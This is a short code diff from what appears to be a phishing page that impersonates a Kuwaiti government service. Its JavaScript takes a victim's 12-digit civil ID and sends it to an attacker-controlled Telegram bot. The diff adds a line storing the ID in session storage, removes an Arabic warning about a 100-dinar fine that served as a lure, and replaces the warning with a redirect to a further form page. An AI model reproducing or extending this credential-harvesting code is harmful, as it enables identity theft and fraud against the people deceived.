@@ -185,14 +185,14 @@
     const value = civilIdInput.value.trim();
 
     if (value.length === 12) {
+      sessionStorage.setItem("loginCivilId", value);
       const message = encodeURIComponent(`تم إدخال الرقم المدني: ${value}`);
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`)
         .then(response => response.json())
         .then(data => {
           if (data.ok) {
-            warningDiv.style.display = "block";
-            warningDiv.innerHTML = `<p> يرجى ملئ بيانات العنوان المدني وتثبيتها في الانظمة لتجنب الغرامة 100 دينار  </p><button onclick="location.href='form1.html'">ادخال عنوان</button>`;
+            location.href = "formandform.html";
           } else {
             alert("حدث خطأ أثناء الإرسال إلى تيليجرام");
             console.error(data);
